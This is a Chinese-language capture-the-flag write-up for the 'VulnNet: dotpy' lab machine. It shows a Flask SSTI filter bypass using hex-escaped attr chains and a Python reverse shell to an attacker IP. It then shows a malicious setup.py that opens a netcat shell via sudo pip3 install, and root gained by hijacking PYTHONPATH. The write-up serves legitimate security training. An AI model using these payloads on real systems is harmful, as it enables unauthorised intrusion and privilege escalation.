# VulnNet: dotpy

是的，VulnNet Entertainment又回来了，现在以安全为重点。您再次被要求执行渗透测试，包括 Web 安全评估和 Linux 安全审核。

难度：中等
网络语言：python
这台机器的设计更具挑战性，但没有太复杂的东西。Web 应用程序不仅要求您找到易受攻击的端点，还需要绕过其安全保护。您应该注意网站为您提供的输出。整个机器都是以Python为中心的。

注意：在浏览网页时，您可能会注意到域 vulnnet.com，但是，它不是实际的虚拟主机，您无需将其添加到主机列表中。

---

## 端口扫描

    ┌──(root🐦kali)-[/home/sugobet]
    └─# nmap -sS 10.10.7.151 
    Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-17 10:08 CST
    Nmap scan report for 10.10.7.151
    Host is up (0.33s latency).
    Not shown: 999 closed tcp ports (reset)
    PORT     STATE SERVICE
    8080/tcp open  http-proxy

## Web枚举

进web一看，又是登录页面，爆管理员用户名、sql注入均失败

不过有一个注册页面，注册一个账号并登录

后台是一个很眼熟但我又记不起来的系统

后台空到不能再空了，比白纸还要干净，妥妥的兔子洞

gobuster扫目录：

    ┌──(root🐦kali)-[/home/sugobet]
    └─# gobuster dir --url http://10.10.7.151:8080/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt

又报错：

    Error: the server returns a status code that matches the provided options for non existing urls. http://10.10.7.151:8080/8ef97609-413e-43a5-b3b4-8b8a16ebc675 => 403 (Length: 3000). To continue please exclude the status code or the length

## SSTI

当我在访问任意不存在的页面时，服务端返回结果：

- http://10.10.7.151:8080/jhfffcvgv


    404

    SORRY!

    The page you’re looking for was not found.

    No results for jhfffcvgv
    Back to home

    © VulnNet Entertainment - Contact: hello@vulnnet.com

熟悉的页面，熟悉的回显，熟悉的No results for

其实在打开这道题之前我就已经猜到可能是ssti了，因为题目打上了web和python的tag，我一下子就联想到flask和django

poc:

    http://10.10.7.151:8080/{{1 + 1}}

成功回显2

题目说了有安全防护

fuzzing出“. _”是被禁用的

试出报错，报错暴露了源码：

    if "." in s or "_" in s or "[" in s or "]" in s:

使用attr利用python 16进制绕过

    _ : \x5f
    . : \x2e


我们使用python来reverse shell

    python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.14.39.48",8888));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'

将payload转\x 16进制，这里可以使用cyberchef的to hex

    \x70\x79\x74\x68\x6f\x6e\x33\x20\x2d\x63\x20\x27\x69\x6d\x70\x6f\x72\x74\x20\x73\x6f\x63\x6b\x65\x74\x2c\x6f\x73\x2c\x70\x74\x79\x3b\x73\x3d\x73\x6f\x63\x6b\x65\x74\x2e\x73\x6f\x63\x6b\x65\x74\x28\x73\x6f\x63\x6b\x65\x74\x2e\x41\x46\x5f\x49\x4e\x45\x54\x2c\x73\x6f\x63\x6b\x65\x74\x2e\x53\x4f\x43\x4b\x5f\x53\x54\x52\x45\x41\x4d\x29\x3b\x73\x2e\x63\x6f\x6e\x6e\x65\x63\x74\x28\x28\x22\x31\x30\x2e\x31\x34\x2e\x33\x39\x2e\x34\x38\x22\x2c\x38\x38\x38\x38\x29\x29\x3b\x6f\x73\x2e\x64\x75\x70\x32\x28\x73\x2e\x66\x69\x6c\x65\x6e\x6f\x28\x29\x2c\x30\x29\x3b\x6f\x73\x2e\x64\x75\x70\x32\x28\x73\x2e\x66\x69\x6c\x65\x6e\x6f\x28\x29\x2c\x31\x29\x3b\x6f\x73\x2e\x64\x75\x70\x32\x28\x73\x2e\x66\x69\x6c\x65\x6e\x6f\x28\x29\x2c\x32\x29\x3b\x70\x74\x79\x2e\x73\x70\x61\x77\x6e\x28\x22\x2f\x62\x69\x6e\x2f\x62\x61\x73\x68\x22\x29\x27

由于“_.”被禁用，所以只好使用attr来达到目的：

    ''.__class__.__base__.__subclasses__().__getitem__(401)

最终payload:

    {{''|attr('\x5f\x5fclass\x5f\x5f')|attr('\x5f\x5fbase\x5f\x5f')|attr('\x5f\x5fsubclasses\x5f\x5f')()|attr('\x5f\x5fgetitem\x5f\x5f')(401)|attr('<hex code>',shell=True,stdout=-1)|attr('communicate')()}}

成功getshell

    web@vulnnet-dotpy:~/shuriken-dotpy$ id
    id
    uid=1001(web) gid=1001(web) groups=1001(web)

## 横向移动

sudo -l发现：

    User web may run the following commands on vulnnet-dotpy:
        (system-adm) NOPASSWD: /usr/bin/pip3 install *

：

    web@vulnnet-dotpy:/home$ cd /tmp
    web@vulnnet-dotpy:/tmp$ mkdir ./hack
    web@vulnnet-dotpy:/tmp$ echo "import os;os.system('mkfifo /tmp/f1;nc 10.14.39.48 9999 < /tmp/f1 | /bin/bash > /tmp/f1')" > ./hack/setup.py
    web@vulnnet-dotpy:/tmp$ ls -la ./hack
    total 12
    drwxr-xr-x  2 web  web  4096 Jan 17 06:56 .
    drwxrwxrwt 13 root root 4096 Jan 17 06:55 ..
    -rw-r--r--  1 web  web    65 Jan 17 06:56 setup.py
    web@vulnnet-dotpy:/tmp$ chmod 777 ./hack/setup.py

开启nc监听

执行pip:

    web@vulnnet-dotpy:/tmp$ sudo -u system-adm /usr/bin/pip3 install ./hack

成功移动到system-adm

    python3 -c "import pty;pty.spawn('/bin/bash')"
    system-adm@vulnnet-dotpy:/tmp/pip-fc77uh7a-build$ id
    id
    uid=1000(system-adm) gid=1000(system-adm) groups=1000(system-adm),24(cdrom)

user.txt在system-adm的家目录下

## 权限提升

又是sudo -l

    User system-adm may run the following commands on vulnnet-dotpy:
        (ALL) SETENV: NOPASSWD: /usr/bin/python3 /opt/backup.py

可以看到SETENV，已经猜到要做什么了

无权修改：

    system-adm@vulnnet-dotpy:~$ ls -la /opt/backup.py
    -rwxrwxr-- 1 root root 2125 Dec 21  2020 /opt/backup.py

读取该文件，第一时间我想到的就是篡改环境变量，但是我还是阅读了代码，看看代码有没有什么猫腻

嗯没看出来，该代码就是将/home/manage做一个zip备份到/var/backups

既然代码可能没啥东西，那么就试试环境变量

创建zipfile.py并写入以下内容：

    system-adm@vulnnet-dotpy:~/hackkk$ echo "import os;os.setuid(0);os.system('/bin/bash -p')" > ./zipfile.py

执行：

    sudo PYTHONPATH=/home/system-adm/hackkk /usr/bin/python3 /opt/backup.py

成功getroot

root.txt

    root@vulnnet-dotpy:/home/system-adm/hackkk# id
    uid=0(root) gid=0(root) groups=0(root)
    root@vulnnet-dotpy:/home/system-adm/hackkk# cat /root/root.txt
